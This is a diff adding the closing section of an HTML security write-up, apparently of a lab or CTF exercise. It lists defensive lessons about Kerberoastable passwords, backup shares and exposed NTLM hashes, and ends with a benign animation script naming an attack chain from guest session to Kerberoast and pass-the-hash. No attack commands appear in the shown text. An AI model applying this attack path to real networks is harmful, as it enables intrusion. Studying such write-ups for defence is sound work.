+          <li><strong>Kerberoastable accounts need strong, randomized passwords.</strong> <code>Password123!!</code> satisfies most complexity policies on paper and still falls instantly to a wordlist.</li>
+          <li><strong>Backup shares keep being the weak link.</strong> Same root cause as the hardcoded sync-script credential in <a href="operation-endgames.html">Operation EndGames</a> — infrastructure scripts and backup processes routinely get less scrutiny than the systems they protect.</li>
+          <li><strong>Don't store raw NTLM hashes anywhere a low-privileged account can read them.</strong> Once exposed, pass-the-hash spraying turned them into admin in one command.</li>
+        </ul>
+      </section>
+
+    </main>
+  </div>
+
+  <footer class="term-footer">
+    <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cursor">▌</span></div>
+    <p>Thanks for reading. Found something I should add or clarify? Open an issue or drop a comment.</p>
+  </footer>
+
+</div>
+
+<script>
+(function(){
+  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  var el = document.getElementById('heroTyped');
+  var full = "Reconstructing breach timeline: guest session → RID cycling → Kerberoast → pass-the-hash → root.";
+  if (reduce){
+    el.textContent = full;
+  } else {
+    var i = 0;
+    el.innerHTML = '<span class="cursor">▌</span>';
+    function type(){
+      if (i <= full.length){
+        el.innerHTML = full.slice(0, i) + '<span class="cursor">▌</span>';
+        i++;
+        setTimeout(type, 22);
+      }
+    }
+    setTimeout(type, 500);
+  }
+
+  // active section highlighting
+  var links = Array.prototype.slice.call(document.querySelectorAll('#navList a'));
+  var sections = links.map(function(a){ return document.querySelector(a.getAttribute('href')); }).filter(Boolean);
+  if ('IntersectionObserver' in window && sections.length){
+    var map = {};
+    sections.forEach(function(s, idx){ map[s.id] = links[idx]; });
+    var obs = new IntersectionObserver(function(entries){
+      entries.forEach(function(entry){
+        var link = map[entry.target.id];
+        if (!link) return;
+        if (entry.isIntersecting){
+          links.forEach(function(l){ l.classList.remove('active'); });
+          link.classList.add('active');
+        }
+      });
+    }, { rootMargin: '-15% 0px -70% 0px', threshold: 0 });
+    sections.forEach(function(s){ obs.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
